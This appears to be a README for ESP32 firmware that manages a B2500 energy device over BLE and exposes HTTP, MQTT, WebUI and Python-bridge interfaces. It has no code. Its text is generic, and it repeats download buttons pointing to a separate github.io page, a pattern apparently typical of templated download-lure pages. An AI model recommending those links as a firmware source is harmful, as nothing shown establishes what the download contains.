# B2500-Node v1.0 - ESP32 Energy Management Firmware 2026

> **B2500-Node is self-contained ESP32 firmware for operating a single B2500 device per board. It communicates with the device over BLE through HMJ-2 and provides HTTP and MQTT interfaces. Version 1.0 is currently available.**

[![Platform](https://img.shields.io/badge/Platform-ESP32-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/cartercarteragb800/b2500-node-v1-energy-hub?style=flat-square)](https://github.com/cartercarteragb800/b2500-node-v1-energy-hub)

---

<p align="center">
  <a href="https://cartercarteragb800.github.io/b2500-node-v1-energy-hub/">
    <img src="https://img.shields.io/badge/Download-B2500-Node%20Latest-brightgreen?style=for-the-badge" alt="Download B2500-Node">
  </a>
</p>

> **[Download B2500-Node v1.0](https://cartercarteragb800.github.io/b2500-node-v1-energy-hub/)**

---

[Download Latest Build](https://cartercarteragb800.github.io/b2500-node-v1-energy-hub/)

---

## Project Overview

B2500-Node brings B2500 energy-management functions to an ESP32 controller. The firmware links BLE device communication with network services and monitoring features, allowing other systems to inspect operating state, issue commands, and coordinate control through one compact node.

Each ESP32 is intended to manage one B2500 device. Integration options include MQTT, a Python bridge, and a browser-based WebUI, making the project suitable for automation setups that need operational data and control available through HTTP and local web tools.

---

## Included Capabilities

- Runs independently on an ESP32 for one B2500 device
- Communicates over BLE with the HMJ-2 protocol
- Offers HTTP endpoints for status queries, setup, and commands
- Publishes and receives data through MQTT integration
- Supports centralized workflows through a Python bridge
- Includes a WebUI for monitoring the local device
- Provides Deye inverter integration support
- Provides Tronic device integration support

---

## Getting Started

1. Download the repository or obtain the latest build from the download link.
2. Load the project in an ESP32-compatible development environment.
3. Compile and flash the firmware onto the selected ESP32 board.
4. Once the board starts, connect through its available network interface or pair it with the B2500 device it will manage.

For a source-based installation, the usual sequence is:

- Clone the repository
- Build the firmware for the chosen ESP32 target
- Upload it to the board
- Use the WebUI or HTTP API to complete configuration

---

## Operating the Node

After flashing, the board acts as a network-connected control point for a single B2500 device.

Typical tasks include:

- Querying current device information with the HTTP API
- Sending configuration values and control commands from external software
- Using MQTT topics for monitoring and automation
- Routing centralized control through the Python bridge
- Viewing the device in the WebUI during setup or troubleshooting

A representative setup sequence looks like this:

1. Start the ESP32 and perform the initial configuration.
2. Verify that BLE communication with the paired B2500 is working.
3. Obtain device status over HTTP or MQTT.
4. Attach Python logic, inverter integration, or another automation system.

---

## Settings and Interfaces

Initial and runtime settings are supplied through the firmware's configuration flow and exposed interfaces. The appropriate method depends on the deployment: use the HTTP endpoints, the WebUI, or an external automation layer.

Configuration commonly covers:

- B2500 connection information
- MQTT connection parameters
- API and command behavior
- Options required by external integrations

The available interface structure includes:

- `setup` for preparing the device
- `status` for reading current operating information
- Command endpoints for control operations

---

## Requirements

- ESP32 hardware
- A single B2500 device for each ESP32 node
- BLE capability for HMJ-2 communication
- Network connectivity when using HTTP or MQTT
- A compatible Python environment for the central bridge
- Enough storage for the firmware and runtime configuration

---

## Frequently Asked Questions

**How many B2500 devices can one node manage?**  
The firmware is intended to manage one B2500 per ESP32, using BLE communication through the HMJ-2 protocol.

**Can it be connected to an automation system?**  
Yes. HTTP endpoints, MQTT integration, and the Python bridge provide several ways to connect external control logic.

**Does the firmware include a web interface?**  
Yes. The included WebUI provides local monitoring and basic interaction.

**Which additional hardware integrations are available?**  
The project includes integration support for Deye inverters and Tronic devices.

**What should I check during troubleshooting?**  
Start with the WebUI, then verify BLE pairing and network configuration. Also check the HTTP or MQTT connection details configured in the controlling system.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
